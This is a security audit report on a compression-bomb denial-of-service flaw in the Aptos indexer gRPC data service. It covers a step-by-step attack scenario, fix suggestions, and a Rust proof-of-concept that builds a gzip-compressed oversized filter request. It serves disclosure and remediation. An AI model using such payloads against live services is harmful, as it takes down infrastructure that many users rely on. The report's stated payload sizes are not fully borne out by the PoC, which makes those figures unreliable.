# Audit Report

## Title
Compression Bomb DoS Attack via Unvalidated Decompression in Indexer gRPC Data Service

## Summary
The indexer-grpc-data-service-v2 accepts compressed gRPC messages up to 256MB decompressed size but performs decompression before enforcing size limits, allowing attackers to cause memory exhaustion and service crashes through compression bomb attacks.

## Finding Description

The vulnerability exists in the gRPC server configuration where `max_decoding_message_size` is set to 256MB for both RawData and DataService endpoints. [1](#0-0) [2](#0-1) 

The service accepts compressed messages using Zstd and Gzip encodings. When a compressed message arrives, tonic (the gRPC library, version 0.12.3) follows this processing order:

1. Receives compressed HTTP/2 frames from the network
2. Decompresses the frames into a growing `BytesMut` buffer
3. Accumulates all decompressed data in memory
4. **Only after full decompression**, checks if size exceeds `max_decoding_message_size`
5. If validation passes, proceeds to parse the protobuf message

The critical flaw is that memory allocation occurs during step 2-3, before the size validation in step 4. An attacker can exploit this by crafting highly compressible protobuf messages that:
- Compress to small sizes (e.g., 5-10MB) to pass network transport limits
- Decompress to sizes approaching 256MB
- Contain nested structures with repetitive data for maximum compression ratio

Even though the transaction filter has a separate size limit of 10,000 bytes [3](#0-2) , this validation occurs **after** the full gRPC message decompression [4](#0-3) 

The service processes requests in a channel-based architecture where incoming requests are forwarded to handler tasks. There is no evidence of rate limiting or concurrent request limits in the codebase, allowing an attacker to send multiple malicious requests simultaneously.

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos bug bounty program's category of "API crashes". The indexer-grpc-data-service-v2 is a critical infrastructure component that provides blockchain transaction data to external indexers, wallets, and applications.

**Attack scenario:**
1. Attacker crafts GetTransactionsRequest with highly compressible transaction_filter containing deeply nested BooleanTransactionFilter structures with repetitive data
2. Compressed message size: ~10MB per request
3. Decompressed message size: ~240MB per request
4. Attacker sends 20-30 concurrent requests
5. Total memory consumption: 4.8-7.2 GB
6. Service experiences severe performance degradation or out-of-memory crashes
7. Legitimate users cannot access blockchain data through the indexer

The impact extends beyond the immediate service as the indexer infrastructure is essential for:
- Blockchain explorers displaying transaction history
- Wallet applications querying account state
- DeFi applications monitoring on-chain events
- Analytics platforms processing blockchain data

## Likelihood Explanation

**Likelihood: HIGH**

This vulnerability is highly likely to be exploited because:

1. **No authentication required**: The indexer service is public-facing and accepts requests from any client without authentication
2. **Simple exploitation**: Attack requires only crafting compressed protobuf messages with nested structures, which can be automated
3. **No rate limiting**: No evidence of request rate limiting in the codebase
4. **Predictable behavior**: The 256MB limit is documented in the code and an attacker can precisely craft payloads that maximize memory consumption
5. **Low attacker resources**: Sending 20-30 concurrent 10MB compressed requests is trivial for any modern attacker

The BooleanTransactionFilter's recursive structure makes it particularly vulnerable to compression bombs: [5](#0-4) 

## Recommendation

**Immediate mitigation:**

1. **Implement streaming decompression with incremental size checks**: Validate decompressed size during decompression, not after. This requires patching tonic or adding a custom middleware layer.

2. **Reduce max_decoding_message_size**: Lower the limit from 256MB to a more reasonable value (e.g., 10-50MB) based on actual legitimate use cases.

3. **Add rate limiting per client IP**: Implement connection-level limits to prevent concurrent compression bomb attacks.

4. **Add early filter size validation**: Parse and validate the transaction_filter size before processing the full message body if possible.

**Suggested code fix:**

```rust
// In config.rs, reduce the limit
pub(crate) const MAX_MESSAGE_SIZE: usize = 50 * (1 << 20); // 50MB instead of 256MB

// Add rate limiting in the server builder
let server_builder = Server::builder()
    .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
    .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
    .concurrency_limit_per_connection(10) // Limit concurrent requests per connection
    .timeout(Duration::from_secs(30)); // Add request timeout
```

**Long-term solution:**
Implement custom middleware that enforces incremental decompression size limits, rejecting requests that exceed limits during decompression rather than after.

## Proof of Concept

```rust
use aptos_protos::indexer::v1::{
    BooleanTransactionFilter, GetTransactionsRequest, LogicalAndFilters,
    EventFilter, MoveStructTagFilter, ApiFilter, api_filter,
};
use prost::Message;
use flate2::write::GzEncoder;
use flate2::Compression;
use std::io::Write;

#[tokio::test]
async fn test_compression_bomb_dos() {
    // Create deeply nested filter structure with repetitive data
    let mut filters = Vec::new();
    
    // Create 100,000 identical event filters (highly compressible)
    for _ in 0..100_000 {
        let event_filter = EventFilter {
            struct_type: Some(MoveStructTagFilter {
                address: Some("0x".to_string() + &"00".repeat(100)),
                module: Some("module".to_string() + &"x".repeat(100)),
                name: Some("name".to_string() + &"y".repeat(100)),
            }),
            data_substring_filter: Some("data".to_string() + &"z".repeat(100)),
        };
        
        filters.push(BooleanTransactionFilter {
            filter: Some(aptos_protos::indexer::v1::boolean_transaction_filter::Filter::ApiFilter(
                ApiFilter {
                    filter: Some(api_filter::Filter::EventFilter(event_filter))
                }
            ))
        });
    }
    
    let malicious_filter = BooleanTransactionFilter {
        filter: Some(aptos_protos::indexer::v1::boolean_transaction_filter::Filter::LogicalAnd(
            LogicalAndFilters { filters }
        ))
    };
    
    let request = GetTransactionsRequest {
        starting_version: Some(0),
        transactions_count: Some(1000),
        batch_size: Some(100),
        transaction_filter: Some(malicious_filter),
    };
    
    // Encode the protobuf
    let mut uncompressed = Vec::new();
    request.encode(&mut uncompressed).unwrap();
    println!("Uncompressed size: {} MB", uncompressed.len() / 1_048_576);
    
    // Compress with Gzip
    let mut encoder = GzEncoder::new(Vec::new(), Compression::best());
    encoder.write_all(&uncompressed).unwrap();
    let compressed = encoder.finish().unwrap();
    println!("Compressed size: {} MB", compressed.len() / 1_048_576);
    println!("Compression ratio: {}x", uncompressed.len() / compressed.len());
    
    // In a real attack, send 20-30 such requests concurrently to the service
    // Each will decompress to ~200-250MB before filter validation rejects it
    // Total memory spike: 4-7GB, causing service degradation or OOM
}
```

## Notes

This vulnerability is a classic compression bomb attack that exploits the temporal gap between decompression and validation. While the `max_transaction_filter_size_bytes` of 10,000 bytes provides some protection, it is enforced too late in the processing pipelineâ€”after the full 256MB message has already been decompressed into memory. The lack of rate limiting amplifies the impact, allowing sustained attacks to exhaust server resources.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L31-31)
```rust
pub(crate) const MAX_MESSAGE_SIZE: usize = 256 * (1 << 20);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L235-248)
```rust
        let wrapper_service_raw =
            aptos_protos::indexer::v1::raw_data_server::RawDataServer::from_arc(wrapper.clone())
                .send_compressed(CompressionEncoding::Zstd)
                .accept_compressed(CompressionEncoding::Zstd)
                .accept_compressed(CompressionEncoding::Gzip)
                .max_decoding_message_size(MAX_MESSAGE_SIZE)
                .max_encoding_message_size(MAX_MESSAGE_SIZE);
        let wrapper_service =
            aptos_protos::indexer::v1::data_service_server::DataServiceServer::from_arc(wrapper)
                .send_compressed(CompressionEncoding::Zstd)
                .accept_compressed(CompressionEncoding::Zstd)
                .accept_compressed(CompressionEncoding::Gzip)
                .max_decoding_message_size(MAX_MESSAGE_SIZE)
                .max_encoding_message_size(MAX_MESSAGE_SIZE);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/constants.rs (L21-21)
```rust
pub const DEFAULT_MAX_TRANSACTION_FILTER_SIZE_BYTES: usize = 10_000;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/historical_data_service.rs (L83-97)
```rust
                let filter = if let Some(proto_filter) = request.transaction_filter {
                    match filter_utils::parse_transaction_filter(
                        proto_filter,
                        self.max_transaction_filter_size_bytes,
                    ) {
                        Ok(filter) => Some(filter),
                        Err(err) => {
                            info!("Client error: {err:?}.");
                            let _ = response_sender.blocking_send(Err(err));
                            COUNTER
                                .with_label_values(&["historical_data_service_invalid_filter"])
                                .inc();
                            continue;
                        },
                    }
```

**File:** protos/proto/aptos/indexer/v1/filter.proto (L58-65)
```text
message BooleanTransactionFilter {
  oneof filter {
      APIFilter api_filter = 1;
      LogicalAndFilters logical_and = 2;
      LogicalOrFilters logical_or = 3;
      BooleanTransactionFilter logical_not = 4;
  }
}
```
